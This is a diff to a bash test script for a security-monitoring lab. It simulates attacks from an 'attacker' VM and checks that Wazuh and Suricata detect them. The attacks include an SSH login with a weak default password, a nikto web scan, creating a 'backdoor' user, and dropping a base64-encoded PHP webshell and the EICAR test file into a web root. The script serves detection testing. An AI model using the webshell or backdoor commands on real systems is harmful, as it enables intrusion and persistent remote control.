@@ -34,16 +34,20 @@ network() {
   check "pc2 : DNS 1.1.1.1" has "$dns" 1.1.1.1
   check "pc2 : pas de DNS NAT 10.0.2.3" not has "$dns" 10.0.2.3
   check "pc2 : Internet via le routeur" test "$(on pc2 "curl -s -o /dev/null -w '%{http_code}' https://example.com")" = 200
-  check "attacker : 203.0.113.1:22 ouvert (DNAT pc1)" on attacker 'nc -z -w3 203.0.113.1 22'
+  check "attacker : 203.0.113.1:22 ouvert (SSH -> pc1)" on attacker 'nc -z -w3 203.0.113.1 22'
+  check "attacker : 203.0.113.1:80 ouvert (web -> pc2)" on attacker 'nc -z -w3 203.0.113.1 80'
+  check "attacker : 203.0.113.1:2222 ouvert (SSH -> pc3)" on attacker 'nc -z -w3 203.0.113.1 2222'
   check "attacker : 203.0.113.1:443 bloqué" not on attacker 'nc -z -w3 203.0.113.1 443'
   check "router : drop journalisé (FW-DROP)" on router "sudo grep -q 'FW-DROP.*SRC=203.0.113.66' /var/log/kern.log"
   check "attacker : LAN injoignable" not on attacker 'nc -z -w3 192.168.10.11 22'
-  check "router : une seule règle dnat" test "$(on router "sudo nft list ruleset | grep -c 'dnat to'")" = 1
+  check "router : trois règles dnat (une par poste)" test "$(on router "sudo nft list ruleset | grep -c 'dnat to'")" = 3
 }
 
-pc1() {
-  check "attacker : site web de pc1 via 203.0.113.1" has "$(on attacker 'curl -s http://203.0.113.1')" LAB-PC1
-  check "attacker : SSH admin/admin123 aboutit sur pc1" test "$(on attacker 'sshpass -p admin123 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@203.0.113.1 hostname')" = pc1
+cibles() {
+  local ssh='sshpass -p admin123 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null'
+  check "attacker : SSH 203.0.113.1:22 -> pc1" test "$(on attacker "$ssh admin@203.0.113.1 hostname")" = pc1
+  check "attacker : web 203.0.113.1:80 -> pc2" has "$(on attacker 'curl -s http://203.0.113.1')" LAB-pc2
+  check "attacker : SSH 203.0.113.1:2222 -> pc3" test "$(on attacker "$ssh -p 2222 admin@203.0.113.1 hostname")" = pc3
   check "attacker : outils installés" on attacker 'command -v nmap hydra nikto sshpass'
   check "attacker : admin123 en dernier dans la wordlist" test "$(on attacker 'tail -1 /home/vagrant/wordlist.txt')" = admin123
   check "attacker : wordlist de 20 mots" test "$(on attacker 'wc -l < /home/vagrant/wordlist.txt')" = 20
@@ -57,7 +61,7 @@ wazuh() {
 
 agents() {
   local l; l=$(on wazuh 'sudo /var/ossec/bin/agent_control -l')
-  for n in router pc1 pc2; do
+  for n in router pc1 pc2 pc3; do
     check "wazuh : agent $n actif" grep -Eq "Name: $n,.*Active" <<<"$l"
   done
   check "router : eve.json surveillé une fois" test "$(on router "sudo grep -c '/var/log/suricata/eve.json' /var/ossec/etc/ossec.conf")" = 1
@@ -94,9 +98,9 @@ demo() {
   # if_matched_group authentication_failures) remplace le simple 5715 et porte l'IP de l'attaquant.
   wait_count "connexion réussie après brute force (pc1)" 'agent.name:pc1 AND rule.id:40112 AND data.srcip:203.0.113.66'
 
-  echo "-- scan web (nikto) --"
+  echo "-- scan web (nikto) -> pc2 --"
   on attacker 'nikto -h http://203.0.113.1 -maxtime 60s' >/dev/null 2>&1
-  wait_count "attaque web vue par pc1" 'agent.name:pc1 AND rule.groups:web AND data.srcip:203.0.113.66'
+  wait_count "attaque web vue par pc2" 'agent.name:pc2 AND rule.groups:web AND data.srcip:203.0.113.66'
   wait_count "attaque web vue par Suricata" 'agent.name:router AND rule.id:86601 AND data.dest_port:80'
 }
 
@@ -106,18 +110,18 @@ postex() {
   R=$(date +%s)
   shell='PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4='                                            # <?php system($_GET[c]); ?>
   eicar='WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='  # chaîne de test EICAR
-  echo "-- post-exploitation : SSH admin -> escalade root -> backdoor + webshell --"
+  echo "-- post-exploitation sur pc1 : SSH admin -> escalade root -> backdoor + webshell --"
   on attacker "sshpass -p admin123 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@203.0.113.1 'sudo useradd -m -s /bin/bash backdoor$R 2>/dev/null; echo $shell | base64 -d | sudo tee /var/www/html/shell_$R.php >/dev/null'" >/dev/null 2>&1
-  wait_count "nouvel utilisateur créé (backdoor)" 'agent.name:pc1 AND rule.id:5902'
-  wait_count "escalade sudo détectée" 'agent.name:pc1 AND rule.id:5403'
-  wait_count "webshell déposé dans le web root (FIM)" "agent.name:pc1 AND rule.id:554 AND syscheck.path:*shell_$R*"
+  wait_count "nouvel utilisateur créé (pc1)" 'agent.name:pc1 AND rule.id:5902'
+  wait_count "escalade sudo vers root (pc1)" 'agent.name:pc1 AND rule.id:5402'
+  wait_count "webshell déposé dans le web root (pc1, FIM)" "agent.name:pc1 AND rule.id:554 AND syscheck.path:*shell_$R*"
 
-  echo "-- dépôt de malware (EICAR) --"
-  on attacker "sshpass -p admin123 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@203.0.113.1 'echo $eicar | base64 -d | sudo tee /var/www/html/eicar_$R.com >/dev/null'" >/dev/null 2>&1
-  wait_count "fichier malveillant EICAR détecté (FIM)" "agent.name:pc1 AND rule.id:554 AND syscheck.path:*eicar_$R*"
+  echo "-- dépôt de malware (EICAR) sur pc3 (SSH port 2222) --"
+  on attacker "sshpass -p admin123 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 admin@203.0.113.1 'echo $eicar | base64 -d | sudo tee /var/www/html/eicar_$R.com >/dev/null'" >/dev/null 2>&1
+  wait_count "fichier malveillant EICAR détecté (pc3, FIM)" "agent.name:pc3 AND rule.id:554 AND syscheck.path:*eicar_$R*"
 }
 
 set -- "${@:-all}"
-[ "$1" = all ] && set -- network pc1 wazuh agents suricata demo postex
+[ "$1" = all ] && set -- network cibles wazuh agents suricata demo postex
 for s in "$@"; do echo "== $s"; "$s"; done
 exit $fail
